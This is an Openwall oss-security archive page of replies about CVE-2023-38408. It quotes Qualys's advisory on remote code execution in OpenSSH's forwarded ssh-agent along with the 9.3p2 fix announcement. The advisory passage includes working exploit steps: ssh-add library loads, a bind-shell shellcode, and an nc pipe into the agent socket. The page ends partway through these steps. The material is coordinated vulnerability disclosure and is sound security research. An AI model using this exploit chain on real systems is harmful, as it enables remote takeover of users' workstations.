mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[<thread-prev]](../../../2023/07/19/8) [[thread-next>]](3) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <ZLk1hSUEt00caovk@itl-email>
Date: Thu, 20 Jul 2023 09:24:21 -0400
From: Demi Marie Obenour <demi@...isiblethingslab.com>
To: oss-security@...ts.openwall.com
Subject: Re: Announce: OpenSSH 9.3p2 released

On Wed, Jul 19, 2023 at 08:40:40AM -0600, Damien Miller wrote:
> OpenSSH 9.3p2 has just been released. It will be available from the
> mirrors listed at <https://www.openssh.com/> shortly.
>
> OpenSSH is a 100% complete SSH protocol 2.0 implementation and
> includes sftp client and server support.
>
> Once again, we would like to thank the OpenSSH community for their
> continued support of the project, especially those who contributed
> code or patches, reported bugs, tested snapshots or donated to the
> project. More information on donations may be found at:
> <https://www.openssh.com/donations.html>
>
> Changes since OpenSSH 9.3
> =========================
>
> This release fixes a security bug.
>
> Security
> ========
>
> Fix CVE-2023-38408 - a condition where specific libaries loaded via
> ssh-agent(1)'s PKCS#11 support could be abused to achieve remote
> code execution via a forwarded agent socket if the following
> conditions are met:
>
> * Exploitation requires the presence of specific libraries on
>   the victim system.
> * Remote exploitation requires that the agent was forwarded
>   to an attacker-controlled system.
>
> Exploitation can also be prevented by starting ssh-agent(1) with an
> empty PKCS#11/FIDO allowlist (ssh-agent -P '') or by configuring
> an allowlist that contains only specific provider libraries.
>
> This vulnerability was discovered and demonstrated to be exploitable
> by the Qualys Security Advisory team.
>
> In addition to removing the main precondition for exploitation,
> this release removes the ability for remote ssh-agent(1) clients
> to load PKCS#11 modules by default (see below).
>
> Potentially-incompatible changes
> --------------------------------
>
>  * ssh-agent(8): the agent will now refuse requests to load PKCS#11
>    modules issued by remote clients by default. A flag has been added
>    to restore the previous behaviour "-Oallow-remote-pkcs11".
>
>    Note that ssh-agent(8) depends on the SSH client to identify
>    requests that are remote. The OpenSSH >=8.9 ssh(1) client does
>    this, but forwarding access to an agent socket using other tools
>    may circumvent this restriction.
>
> Checksums:
> ==========
>
> - SHA1 (openssh-9.3p2.tar.gz) = 219cf700c317f400bb20b001c0406056f7188ea4
> - SHA256 (openssh-9.3p2.tar.gz) = IA6+FH9ss/EB/QzfngJEKvfdyimN/9n0VoeOfMrGdug=
>
> Please note that the SHA256 signatures are base64 encoded and not
> hexadecimal (which is the default for most checksum tools). The PGP
> key used to sign the releases is available from the mirror sites:
> <https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/RELEASE_KEY.asc>
>
> Reporting Bugs:
> ===============
>
> - Please read <https://www.openssh.com/report.html>
>   Security bugs should be reported directly to openssh@...nssh.com

Should there be a system-wide configuration file containing a list of
known-good PKCS#11 libraries?  ssh-agent having to guess if something is
a PKCS#11 library is less than awesome.
--
Sincerely,
Demi Marie Obenour (she/her/hers)
Invisible Things Lab

Download attachment "[signature.asc](2/1)" of type "application/pgp-signature" (834 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_4b350e1d_20250110_133621.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](../../../2023/07/19/9) [[next>]](2) [[<thread-prev]](../../../2023/07/19/9) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID:
 <MN0PR11MB611155CE342371EBED98F38AC039A@MN0PR11MB6111.namprd11.prod.outlook.com>
Date: Wed, 19 Jul 2023 22:13:56 +0000
From: Ramon de C Valle <rcvalle@...e.com>
To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
Subject: Re: CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded
 ssh-agent

> 1/ Some shared libraries require an executable stack, either explicitly
> because of an RWE (readable, writable, executable) GNU_STACK ELF header,
> or implicitly because of a missing GNU_STACK ELF header (in which case
> the loader defaults to an executable stack): when such an "execstack"
> library is dlopen()ed, the loader makes the main stack and all thread
> stacks executable, and they remain executable even after dlclose().
>
> For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
> installation of Ubuntu Desktop 22.04.

I reported and tried to fix this in 2012: [https://lore.kernel.org/lkml/f298f914-2239-44e4-8aa1-a51282e7fac0@zmail15.collab.prod.int.phx2.redhat.com/](https://lore.kernel.org/lkml/f298f914-2239-44e4-8aa1-a51282e7fac0%40zmail15.collab.prod.int.phx2.redhat.com/), and more recently made a note about it at <https://rcvalle.com/2020/09/16/rust-exploit-mitigations/#appendix>. This is something I'd really like to see properly fixed. IMO, the READ_IMPLIES_EXEC personality needs to be completely separated from the PT_GNU_STACK program header by having a separate option for it (or setarch -X could just be used whenever READ_IMPLIES_EXEC is needed), and the absence of the PT_GNU_STACK program header needs to have more secure defaults (unrelated to READ_IMPLIES_EXEC).

________________________________
From: Qualys Security Advisory <qsa@...lys.com>
Sent: Wednesday, July 19, 2023 9:33 AM
To: oss-security@...ts.openwall.com <oss-security@...ts.openwall.com>
Subject: [oss-security] CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded ssh-agent

Qualys Security Advisory

CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded ssh-agent

========================================================================
Contents
========================================================================

Summary
Background
Experiments
Results
Discussion
Acknowledgments
Timeline

========================================================================
Summary
========================================================================

    "ssh-agent is a program to hold private keys used for public key
    authentication. Through use of environment variables the agent can
    be located and automatically used for authentication when logging in
    to other machines using ssh(1). ... Connections to ssh-agent may be
    forwarded from further remote hosts using the -A option to ssh(1)
    (but see the caveats documented therein), avoiding the need for
    authentication data to be stored on other machines."
    (<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fman.openbsd.org%2Fssh-agent.1&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=yjcs4Ynt9Tc6YqjVRROv16ViQw3UbnTsOu4%2FpP6NkMk%3D&reserved=0><<https://man.openbsd.org/ssh-agent.1>>)

    "Agent forwarding should be enabled with caution. Users with the
    ability to bypass file permissions on the remote host ... can access
    the local agent through the forwarded connection. ... A safer
    alternative may be to use a jump host (see -J)."
    (<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fman.openbsd.org%2Fssh.1&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=U%2FkLvG5xpW91TcVhA%2FQQkXyDu6xkrFPFzxw%2BJH%2BhX%2FI%3D&reserved=0><<https://man.openbsd.org/ssh.1>>)

Despite this warning, ssh-agent forwarding is still widely used today.
Typically, a system administrator (Alice) runs ssh-agent on her local
workstation, connects to a remote server with ssh, and enables ssh-agent
forwarding with the -A or ForwardAgent option, thus making her ssh-agent
(which is running on her local workstation) reachable from the remote
server.

While browsing through ssh-agent's source code, we noticed that a remote
attacker, who has access to the remote server where Alice's ssh-agent is
forwarded to, can load (dlopen()) and immediately unload (dlclose()) any
shared library in /usr/lib* on Alice's workstation (via her forwarded
ssh-agent, if it is compiled with ENABLE_PKCS11, which is the default).

(Note to the curious readers: for security reasons, and as explained in
the "Background" section below, ssh-agent does not actually load such a
shared library in its own address space (where private keys are stored),
but in a separate, dedicated process, ssh-pkcs11-helper.)

Although this seems safe at first (because every shared library in
/usr/lib* comes from an official distribution package, and no operation
besides dlopen() and dlclose() is generally performed by ssh-agent on a
shared library), many shared libraries have unfortunate side effects
when dlopen()ed and dlclose()d, and are therefore unsafe to be loaded
and unloaded in a security-sensitive program such as ssh-agent. For
example, many shared libraries have constructor and destructor functions
that are automatically executed by dlopen() and dlclose(), respectively.

Surprisingly, by chaining four common side effects of shared libraries
from official distribution packages, we were able to transform this very
limited primitive (the dlopen() and dlclose() of shared libraries from
/usr/lib*) into a reliable, one-shot remote code execution in ssh-agent
(despite ASLR, PIE, and NX). Our best proofs of concept so far exploit
default installations of Ubuntu Desktop plus three extra packages from
Ubuntu's "universe" repository. We believe that even better results can
be achieved (i.e., some operating systems might be exploitable in their
default installation):

- we only investigated Ubuntu Desktop 22.04 and 21.10, we have not
  looked into any other versions, distributions, or operating systems;

- the "fuzzer" that we wrote to test our ideas is rudimentary and slow,
  and we ran it intermittently on a single laptop, so we have not tried
  all the combinations of shared libraries and side effects;

- we initially had only one attack vector in mind (i.e., one specific
  combination of side effects from shared libraries), but we discovered
  six more while analyzing the results of our fuzzer, and we are
  convinced that more attack vectors exist.

In this advisory, we present our research, experiments, reproducible
results, and further ideas to exploit this "dlopen() then dlclose()"
primitive. We will also publish the source code of our crude fuzzer at
<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fwww.qualys.com%2Fresearch%2Fsecurity-advisories%2F&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=%2FMbEJy3RvkLHTGFD6%2F86IiR7qw78xm9XQqA6xOkOoqs%3D&reserved=0><<https://www.qualys.com/research/security-advisories/>> (warning: this code
might hurt the eyes of experienced fuzzing practitioners, but it gave us
quick answers to our many questions; it is provided "as is", in the hope
that it will be useful).

========================================================================
Background
========================================================================

The ability to load and unload shared libraries in ssh-agent was
developed in 2010 to support the addition and deletion of PKCS#11 keys:
ssh-agent forks and executes a long-running ssh-pkcs11-helper process
that dlopen()s PKCS#11 providers (shared libraries), and immediately
dlclose()s them if the symbol C_GetFunctionList cannot be found (i.e.,
if such a shared library is not actually a PKCS#11 provider, which is
the case for the vast majority of the shared libraries in /usr/lib*).

Note: ssh-agent also supports the addition of FIDO keys, by loading a
FIDO authenticator (a shared library) in a short-lived ssh-sk-helper
process; however, unlike ssh-pkcs11-helper, ssh-sk-helper is stateless
(it terminates shortly after loading a single shared library) and can
therefore not be abused by an attacker to chain the side effects of
several shared libraries.

Originally, the path of a shared library to be loaded in
ssh-pkcs11-helper was not filtered at all by ssh-agent, but in 2016 an
allow-list was added ("/usr/lib*/*,/usr/local/lib*/*" by default) in
response to CVE-2016-10009, which was published by Jann Horn (at
<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fbugs.chromium.org%2Fp%2Fproject-zero%2Fissues%2Fdetail%3Fid%3D1009&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=j6hw2is5FhLWmZ3VfQPPXp%2Bg7VLQlBWEVxYnK%2BSuIyY%3D&reserved=0>):<<https://bugs.chromium.org/p/project-zero/issues/detail?id=1009>>

- if an attacker had access to the server where Alice's ssh-agent is
  forwarded to, and had an unprivileged access to Alice's workstation,
  then this attacker could store a malicious shared library in /tmp on
  Alice's workstation and execute it with Alice's privileges (via her
  forwarded ssh-agent) -- a mild form of Local Privilege Escalation;

- if the attacker had only access to the server where Alice's ssh-agent
  is forwarded to, but could somehow store a malicious shared library
  somewhere on Alice's workstation (without access to her workstation),
  then this attacker could remotely execute this shared library (via
  Alice's forwarded ssh-agent) -- a mild form of Remote Code Execution.

Our first reaction was of course to try to bypass ssh-agent's /usr/lib*
allow-list:

- by finding a logic bug in the filter function, match_pattern_list()
  (but we failed);

- by making a path-traversal attack, for example /usr/lib/../../tmp (but
  we failed, because ssh-agent first calls realpath() to canonicalize
  the path of a shared library, and then calls the filter function);

- by finding a locally or remotely writable file or directory in
  /usr/lib* (but we failed).

Our only option, then, is to abuse side effects of the existing shared
libraries in /usr/lib*; in particular, their constructor and destructor
functions, which are automatically executed by dlopen() and dlclose().
Eventually, we realized that this is essentially a remote version of
CVE-2010-3856, which was published in 2010 by Tavis Ormandy (at
<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fseclists.org%2Ffulldisclosure%2F2010%2FOct%2F344&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=%2FbjeLJwIbyFiW3Vo2r9Rj%2Fo6LACJqDegnjxx1zN5JOQ%3D&reserved=0>):<<https://seclists.org/fulldisclosure/2010/Oct/344>>

- an unprivileged local attacker could dlopen() any shared library from
  /lib and /usr/lib (via the LD_AUDIT environment variable), even when
  executing a SUID-root program;

- the constructor functions of various common shared libraries created
  files and directories whose location depended on the attacker's
  environment variables and whose creation mode depended on the
  attacker's umask;

- the local attacker could therefore create world-writable files and
  directories anywhere in the filesystem, and obtain full root
  privileges (via crond, for example).

Although the ability to load and unload shared libraries from /usr/lib*
in ssh-agent bears a striking resemblance to CVE-2010-3856, we are in a
much weaker position here, because we are trying to exploit ssh-agent
remotely, so we do not control its environment variables nor its umask
(and we do not even talk directly to ssh-pkcs11-helper, which actually
dlopen()s and dlclose()s the shared libraries: we talk to ssh-agent,
which canonicalizes and filters our requests before passing them on to
ssh-pkcs11-helper).

In fact, we do not control anything except the order in which we load
(and immediately unload) shared libraries from /usr/lib* in ssh-agent.
At that point, we almost abandoned our research, because we could not
possibly imagine how to transform this extremely limited primitive into
a one-shot remote code execution. Nevertheless, we felt curious and
decided to syscall-trace (strace) a dlopen() and dlclose() of every
shared library in the default installation of Ubuntu Desktop. We
instantly observed four surprising behaviors:

------------------------------------------------------------------------

1/ Some shared libraries require an executable stack, either explicitly
because of an RWE (readable, writable, executable) GNU_STACK ELF header,
or implicitly because of a missing GNU_STACK ELF header (in which case
the loader defaults to an executable stack): when such an "execstack"
library is dlopen()ed, the loader makes the main stack and all thread
stacks executable, and they remain executable even after dlclose().

For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
installation of Ubuntu Desktop 22.04.

------------------------------------------------------------------------

2/ Many shared libraries are marked as "nodelete" by the loader, either
explicitly because of a NODELETE ELF flag, or implicitly because they
are in the dependency list of a NODELETE library: the loader will never
unload (munmap()) such libraries, even after they are dlclose()d.

For example, /usr/lib/x86_64-linux-gnu/librt.so.1 in the default
installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

3/ Some shared libraries register a signal handler for SIGSEGV when they
are dlopen()ed, but they do not deregister this signal handler when they
are dlclose()d (i.e., this signal handler is still registered when its
code is munmap()ed).

For example, /usr/lib/x86_64-linux-gnu/libSegFault.so in the default
installation of Ubuntu Desktop 21.10.

------------------------------------------------------------------------

4/ Some shared libraries crash with a SIGSEGV as soon as they are
dlopen()ed (usually because of a NULL-pointer dereference), because they
are supposed to be loaded in a specific context, not in a random program
such as ssh-agent.

For example, most of the /usr/lib/x86_64-linux-gnu/xtables/lib*.so in
the default installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

And so an exciting idea to remotely exploit ssh-agent came into our
mind:

a/ make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack) by dlopen()ing one of the "execstack"
libraries ("surprising behavior 1/"), and somehow store a 1990-style
shellcode somewhere in this executable stack;

b/ register a signal handler for SIGSEGV and immediately munmap() its
code, by dlopen()ing and dlclose()ing one of the shared libraries from
"surprising behavior 3/" (consequently, a dangling pointer to this
unmapped signal handler is retained in the kernel);

c/ replace the unmapped signal handler's code with another piece of code
from another shared library, by dlopen()ing (mmap()ing) one of the
"nodelete" libraries ("surprising behavior 2/");

d/ raise a SIGSEGV by dlopen()ing one of the shared libraries from
"surprising behavior 4/", so that the unmapped signal handler is called
by the kernel, but the replacement code from the "nodelete" library is
executed instead (a use-after-free of sorts);

e/ hope that this replacement code (which is mapped where the signal
handler was mapped) is a useful gadget that somehow jumps into the
executable stack, exactly where our shellcode is stored.

========================================================================
Experiments
========================================================================

But "hope is not a strategy", so we decided to implement the following
6-step plan to test our remote-exploitation idea in ssh-agent:

------------------------------------------------------------------------

Step 1 - We install a default Ubuntu Desktop, download all official
packages from Ubuntu's "main" and "universe" repositories, and extract
all /usr/lib* files from these packages. These files occupy ~200GB of
disk space and include ~60,000 shared libraries.

Note: after the default installation of Ubuntu Desktop, but before the
extraction of all /usr/lib* files, we "chattr +i /etc/ld.so.cache" to
make sure that this file does not grow unrealistically (from kilobytes
to megabytes); indeed, it is mmap()ed by the loader every time dlopen()
is called, and a large file might therefore destroy the mmap layout and
prevent our fuzzer's results from being reproducible in the real world.

------------------------------------------------------------------------

Step 2 - For each shared library in /usr/lib*, we fork and execute
ssh-pkcs11-helper, strace it, and request it to dlopen() (and hence
immediately dlclose()) this shared library; if we spot anything unusual
in the strace logs (a raised signal, a clone() call, etc) or outstanding
differences in /proc/pid/maps or /proc/pid/status between before and
after dlopen() and dlclose(), then we mark this shared library as
interesting.

------------------------------------------------------------------------

Step 3 - We analyze the results of Step 2. For example, on Ubuntu
Desktop 22.04:

- 58 shared libraries make the stack executable when dlopen()ed (and the
  stack remains executable even after dlclose());

- 16577 shared libraries permanently alter the mmap layout when
  dlopen()ed (either because they are "nodelete" libraries, or because
  they allocate a thread stack or otherwise leak mmap()ed memory);

- 9 shared libraries register a SIGSEGV handler when dlopen()ed (but do
  not deregister it when dlclose()d), and 238 shared libraries raise a
  SIGSEGV when dlopen()ed;

- 2 shared libraries register a SIGABRT handler when dlopen()ed, and 44
  shared libraries raise a SIGABRT when dlopen()ed.

On Ubuntu Desktop 21.10:

- 30 shared libraries make the stack executable;

- 16172 shared libraries permanently alter the mmap layout;

- 9 shared libraries register a SIGSEGV handler, and 147 shared
  libraries raise a SIGSEGV;

- 2 shared libraries register a SIGABRT handler, and 38 shared libraries
  raise a SIGABRT;

- 1 shared library registers a SIGBUS handler, and 11 shared libraries
  raise a SIGBUS;

- 1 shared library registers a SIGCHLD handler, and 61 shared libraries
  raise a SIGCHLD;

- 1 shared library registers a SIGILL handler, and 1 shared library
  raises a SIGILL.

------------------------------------------------------------------------

Step 4 - We implement a rudimentary fuzzing strategy, by forking and
executing ssh-pkcs11-helper in a loop, and by loading (and unloading)
random combinations of the interesting shared libraries from Step 3:

a/ we randomly load zero or more shared libraries that permanently alter
the mmap layout, in the hope of creating holes in the mmap layout, thus
potentially shifting the replacement code (which will later replace the
signal handler's code) with page precision;

b/ we randomly load one shared library that registers a signal handler
but does not deregister it when dlclose()d (i.e., when munmap()ed);

c/ we randomly load zero or more shared libraries that alter the mmap
layout (again), thus replacing the unmapped signal handler's code with
another piece of code (a hopefully useful gadget) from another shared
library (a "nodelete" library);

d/ we randomly load one shared library that raises the signal that is
caught by the unmapped signal handler: the replacement code (gadget) is
executed instead, and if it jumps into the stack (a SEGV_ACCERR with a
RIP register that points to the stack, because we did not make the stack
executable in this Step 4), then we mark this particular combination of
shared libraries as interesting.

Surprise: we actually get numerous jumps to the stack in this Step 4,
usually because the signal handler's code is replaced by a "jmp REG",
"call REG", or "pop; pop; ret" gadget, and the "REG" or popped RIP
register happens to point to the stack at the time of the jump.

------------------------------------------------------------------------

Step 5 - We implement this extra step to test whether the interesting
combinations of shared libraries from Step 4 actually jump into our
shellcode in the stack, or into uncontrolled data in the stack:

a/ we make the stack executable, by randomly loading one of the
"execstack" libraries from Step 3;

b/ we store ~10KB of 0xcc bytes in the stack buffer "buf" of
ssh-pkcs11-helper's main() function: 10KB is the maximum message length
that we can send to ssh-pkcs11-helper (via ssh-agent), and on amd64 0xcc
is the "int3" instruction that generates a SIGTRAP when executed;

c/ we randomly replay one of the interesting combinations of shared
libraries from Step 4: if a SIGTRAP is generated while the RIP register
points to the stack, then there is a fair chance that ssh-pkcs11-helper
jumped into our shellcode (our 0xcc bytes) in the executable stack.

Surprise: we actually get many SIGTRAPs in the stack during this Step 5,
but to our great dismay, most of these SIGTRAPs are generated because
ssh-pkcs11-helper jumps into the stack, in the middle of a pointer that
is stored on the stack and that happens to contain a 0xcc byte because
of ASLR (i.e., not because ssh-pkcs11-helper jumps into our own 0xcc
bytes in the stack).

------------------------------------------------------------------------

Step 6 - We implement this extra step to eliminate the false positives
produced by Step 5:

a/ we repeatedly replay (N times) each combination of shared libraries
that generates a SIGTRAP in the stack: if N SIGTRAPs are generated out
of N replays, then there is an excellent chance that ssh-pkcs11-helper
does indeed jump into our shellcode (our 0xcc bytes) in the stack (and
not into random bytes that happen to be 0xcc because of ASLR);

b/ if this is confirmed by a manual check (with gdb for example), then
we achieved a reliable, one-shot remote code execution in ssh-agent,
despite the very limited primitive, and despite ASLR, PIE, and NX.

========================================================================
Results
========================================================================

In this section, we present the results of our experiments:

- Signal handler use-after-free (Ubuntu Desktop 22.04)
- Signal handler use-after-free (Ubuntu Desktop 21.10)
- Callback function use-after-free
- Return from syscall use-after-free
- Sigaltstack use-after-free
- Sigreturn to arbitrary instruction pointer
- _Unwind_Context type-confusion
- RCE in library constructor

========================================================================
Signal handler use-after-free (Ubuntu Desktop 22.04)
========================================================================

This was our original idea for remotely attacking ssh-agent, as
discussed at the end of the "Background" section and as implemented in
the "Experiments" section. In this subsection, we present one of the
various combinations of shared libraries that result in a reliable,
one-shot remote code execution in ssh-agent on Ubuntu Desktop 22.04.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 22.04
(<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fold-releases.ubuntu.com%2Freleases%2F22.04%2Fubuntu-22.04-desktop-amd64.iso&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=Asi2VKNB1zU3PO0i%2B2M%2BotE7IgNbsWyWVKhL2XmAVeY%3D&reserved=0><<https://old-releases.ubuntu.com/releases/22.04/ubuntu-22.04-desktop-amd64.iso>>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# grep ' jammy ' /etc/apt/sources.list.backup > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three shared libraries used in this particular attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install eclipse-titan
workstation# apt-get --no-install-recommends install libkf5sonnetui5
workstation# apt-get --no-install-recommends install libns3-3v5

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 1105

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-XXXXXXmgHTo9/agent.1104

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding (indeed,
the ssh-agent itself is running on Alice's workstation, not on the
server):

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

server# export SSH_AUTH_SOCK=/tmp/ssh-N5EjHljGRh/agent.1299

server# ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/systemd/boot/efi/linuxx64.elf.stub": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack buffer "buf" of
ssh-pkcs11-helper's main() function:

server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

- we do not use ssh-add here, because we want to send a ~10KB passphrase
  (our shellcode) to ssh-agent, but ssh-add limits the length of our
  passphrase to 1KB;

- "\x90" x 10000 is a ~10KB "NOP sled" (on amd64, 0x90 is the "nop"
  instruction);

- SHELLCODE is a "TCP bind shell" on port 31337 (from
  <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fshell-storm.org%2Fshellcode%2Ffiles%2Fshellcode-858.html&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=Kk1ZEIG3Eu6RBz4ODQ2Ojr%2Ba3H%2F5d1RpGm7TcCJzaUU%3D&reserved=0>)<<https://shell-storm.org/shellcode/files/shellcode-858.html>>;

- /usr/lib/modules is an existing directory whose path matches
  ssh-agent's /usr/lib* allow-list (indeed, we do not want to actually
  load a shared library here -- we just want to store our shellcode in
  the executable stack);

------------------------------------------------------------------------

3c/ we remotely register a SIGSEGV handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/titan/libttcn3-rt2-dynamic.so": agent refused operation

